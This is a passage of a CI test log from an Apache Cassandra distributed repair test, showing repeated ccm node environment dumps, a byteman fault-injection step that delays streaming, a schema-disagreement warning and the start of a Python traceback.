'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node3/conf'}
01:32:44 23:32:44,127 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '717f59bdf476', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node3/conf'}
01:32:44 23:32:44,128 ccm INFO node3: using Java 8 for the current invocation
01:32:44 23:32:44,128 ccm INFO node3: using Java 8 for the current invocation
01:32:44 23:32:44,210 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '717f59bdf476', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node3/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Dcassandra.migration_task_wait_in_seconds=6'}
01:32:44 23:32:44,210 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '717f59bdf476', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node3/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Dcassandra.migration_task_wait_in_seconds=6'}
01:32:44 23:32:44,210 ccm INFO node3: using Java 8 for the current invocation
01:32:44 23:32:44,210 ccm INFO node3: using Java 8 for the current invocation
01:32:44 23:32:44,251 ccm INFO Starting node3 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
01:32:44 23:32:44,251 ccm INFO Starting node3 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
01:32:44 23:32:46,92 cassandra.cluster WARNING Node 127.0.0.1:9042 is reporting a schema disagreement: {UUID('21b3cef3-4694-35d4-b453-6f8d38b36641'): [<DefaultEndPoint: 127.0.0.2:9042>, <DefaultEndPoint: 127.0.0.1:9042>], UUID('2207c2a9-f598-3971-986b-2926e09e239d'): [<DefaultEndPoint: 127.0.0.3:9042>]}
01:32:46 23:32:58,781 repair_tests.repair_test DEBUG Submitting byteman script to node2
01:32:58 install rule sleep 60s on stream session
01:32:58 
01:32:58 23:32:58,899 repair_tests.repair_test DEBUG repair node1
01:32:58 23:32:58,900 repair_tests.repair_test DEBUG Will kill node2 in middle of sync
01:32:58 23:32:58,984 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '717f59bdf476', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node1/conf'}
01:32:59 23:32:58,984 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '717f59bdf476', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node1/conf'}
01:32:59 23:32:58,985 ccm INFO node1: using Java 8 for the current invocation
01:32:59 23:32:58,985 ccm INFO node1: using Java 8 for the current invocation
01:32:59 23:33:00,1 cassandra.cluster INFO Host 127.0.0.3:9042 may be up; will prepare queries and open connection pool
01:33:00 23:33:02,959 dtest_setup DEBUG Errors were just seen in logs, ending test (if not ending already)!
01:33:03 Exception in thread Thread-18:
01:33:03 Traceback (most recent call last):
01:33:03   File ""/usr/lib/python3.8/threading.py"", line 932, in _bootstrap_inner
01:33:03     self.run()
01:33:03   File ""/home/cassandra/cassandra/venv/lib/python3.8/site-packages/ccmlib/cluster.py"", line 193, in run
01:33:03     self.scan_and_report()
01:33:03   File ""/home/cassandra/cassandra/venv/lib/python3.8/site-packages/ccmlib/cluster.py"", line 186, in scan_and_report
01:33:03     on_error_call(errordata)
